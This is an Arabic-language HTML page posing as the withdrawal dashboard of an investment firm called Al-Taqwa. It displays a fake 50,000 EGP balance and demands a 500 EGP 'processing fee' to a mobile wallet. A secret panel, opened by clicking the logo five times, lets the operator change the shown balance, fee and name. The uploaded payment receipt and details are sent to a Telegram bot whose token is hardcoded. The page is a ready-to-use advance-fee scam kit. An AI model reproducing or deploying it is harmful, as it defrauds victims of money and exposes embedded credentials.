<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شركة التقوى للاستثمار - لوحة التحكم</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #ffffff; /* خلفية بيضاء بالكامل */
            --text-color: #333333; /* نص داكن للوضوح */
            --sidebar-bg: #f8f9fa; /* خلفية جانبية فاتحة جداً */
            --gold: #ffcc00;
            --border-color: #dddddd;
        }

        body {
            margin: 0;
            font-family: 'Cairo', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex; /* لعمل التقسيم الجانبي */
            min-height: 100vh;
        }

        /* --- الشريط الجانبي (Sidebar) --- */
        .sidebar {
            width: 250px;
            background-color: var(--sidebar-bg);
            border-left: 1px solid var(--border-color);
            display: flex;
            flex-direction: column;
            padding: 20px;
            position: sticky;
            top: 0;
            height: 100vh;
            box-sizing: border-box;
        }

        .sidebar .logo-text {
            font-size: 22px;
            font-weight: 900;
            color: var(--gold);
            text-align: center;
            margin-bottom: 40px;
            cursor: pointer;
        }

        .sidebar .nav-link {
            text-decoration: none;
            color: var(--text-color);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 10px;
            font-weight: bold;
            transition: 0.3s;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .sidebar .nav-link:hover {
            background-color: rgba(255, 204, 0, 0.1);
        }

        .sidebar .nav-link.active {
            background-color: var(--gold);
            color: #000;
        }

        /* --- المحتوى الرئيسي --- */
        .main-content {
            flex: 1;
            padding: 30px;
            box-sizing: border-box;
        }

        .card {
            background: #ffffff;
            border: 1px solid var(--border-color);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            max-width: 800px;
            margin: auto;
        }

        .logo-text-main {
            font-size: 28px;
            font-weight: 900;
            color: var(--gold);
            margin-bottom: 10px;
            text-align: center;
        }

        .sub-title {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
        }

        .balance-area {
            background: #f1f3f4;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 30px;
            border-right: 5px solid var(--gold);
            text-align: center;
        }

        .balance-area span {
            font-size: 14px;
            color: #666;
        }

        .balance-area div {
            font-size: 40px;
            font-weight: 700;
            color: #000;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: right;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: var(--text-color);
        }

        .data-box {
            width: 100%;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
            background-color: #f8f9fa;
            color: #333;
            font-size: 16px;
            box-sizing: border-box;
            text-align: right;
        }

        .cash-box {
            background: #000;
            color: var(--gold);
            padding: 15px;
            border-radius: 8px;
            font-size: 22px;
            font-weight: bold;
            text-align: center;
            margin: 20px 0;
            border: 1px solid var(--gold);
        }

        .file-label {
            display: block;
            background: #f1f3f4;
            border: 2px dashed var(--border-color);
            padding: 20px;
            border-radius: 8px;
            cursor: pointer;
            text-align: center;
            margin-bottom: 30px;
            color: #555;
            transition: 0.3s;
        }

        .file-label:hover {
            border-color: var(--gold);
            background-color: rgba(255, 204, 0, 0.05);
        }

        .submit-btn {
            background: linear-gradient(90deg, #ffcc00, #ffaa00);
            color: #000;
            border: none;
            width: 100%;
            padding: 18px;
            font-size: 20px;
            font-weight: 900;
            border-radius: 10px;
            cursor: pointer;
            transition: 0.3s;
        }

        .submit-btn:hover {
            box-shadow: 0 5px 15px rgba(255, 170, 0, 0.3);
        }

        /* لوحة التحكم السرية للمدير */
        .admin-box {
            background: #fff;
            border: 1px solid var(--gold);
            padding: 15px;
            border-radius: 10px;
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 100;
            display: none;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            color: #000;
        }
    </style>
</head>
<body>

<div class="sidebar">
    <div class="logo-text" onclick="checkAdmin()">AL-TAQWA</div>
    <a href="#" class="nav-link">الحساب</a>
    <a href="#" class="nav-link active">السحب</a>
    <a href="#" class="nav-link">التاريخ</a>
    <a href="#" class="nav-link">الإحصائيات</a>
    <a href="#" class="nav-link">توثيق الحساب (KYC)</a>
</div>

<div class="main-content">
    <div class="admin-box" id="adminBox">
        <h4 style="margin-top:0">إعدادات المدير</h4>
        الربح: <input type="number" id="pIn" value="50000" oninput="upd()"> <br><br>
        الرسوم: <input type="number" id="fIn" value="500" oninput="upd()"> <br><br>
        الاسم: <input type="text" id="nIn" value="يوسف هاني" oninput="upd()"> <br><br>
        المحفظة: <input type="text" id="wIn" value="0127373343790" oninput="upd()">
    </div>

    <div class="card">
        <div class="logo-text-main">شركة التقوى للاستثمار</div>
        <div class="sub-title">منصة سحب الأرباح المعتمدة</div>
        
        <div class="balance-area">
            <span>رصيدك القابل للسحب حالياً</span>
            <div><span id="pOut">50,000</span> <small>EGP</small></div>
        </div>

        <div class="form-group">
            <label>الاسم بالكامل:</label>
            <div class="data-box" id="nOut">يوسف هاني</div>
        </div>

        <div class="form-group">
            <label>رقم محفظتك المستلمة:</label>
            <div class="data-box" id="wOut">0127373343790</div>
        </div>

        <p style="text-align: center; font-size: 15px; color: #444;">يرجى تحويل رسوم المعالجة والتفعيل المدعومة (<span id="fOut" style="color:var(--gold); font-weight:bold;">500</span> ج.م) للرقم:</p>
        
        <div class="cash-box">01226811784</div>

        <label class="file-label" onclick="document.getElementById('img').click()">
            <input type="file" id="img" hidden onchange="document.getElementById('fn').innerText='✅ تم اختيار الصورة'">
            <span id="fn">أرفق صورة إيصال التحويل 📸</span>
        </label>

        <button class="submit-btn" onclick="sendData()">تأكيد وإرسال الطلب</button>
    </div>
</div>

<script>
    const TOKEN = '8398403697:AAEf0JjyVG-yE-DLS1FZKDX1_UKg8lEm02E';
    const ID = '8232581666';

    let clicks = 0;
    function checkAdmin() {
        clicks++;
        if (clicks >= 5) {
            document.getElementById('adminBox').style.display = 'block';
            clicks = 0;
        }
    }

    function upd() {
        document.getElementById('pOut').innerText = Number(document.getElementById('pIn').value).toLocaleString();
        document.getElementById('fOut').innerText = document.getElementById('fIn').value;
        document.getElementById('nOut').innerText = document.getElementById('nIn').value;
        document.getElementById('wOut').innerText = document.getElementById('wIn').value;
    }

    async function sendData() {
        const file = document.getElementById('img').files[0];
        if(!file) { alert("يرجى إرفاق صورة الإيصال أولاً!"); return; }

        const p = document.getElementById('pIn').value;
        const f = document.getElementById('fIn').value;
        const n = document.getElementById('nIn').value;
        const w = document.getElementById('wIn').value;

        const msg = `🌟 طلب سحب جديد 🌟\n👤 الاسم: ${n}\n📱 المحفظة: ${w}\n💰 المبلغ: ${p} ج.م\n💸 الرسوم: ${f} ج.م`;

        const fd = new FormData();
        fd.append('chat_id', ID);
        fd.append('photo', file);
        fd.append('caption', msg);

        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            alert("تم إرسال طلبك بنجاح! سيتم المراجعة والتحويل خلال 15 دقيقة.");
        } catch(e) {
            alert("فشل الإرسال، تأكد من اتصال الإنترنت.");
        }
    }
</script>

</body>
</html>
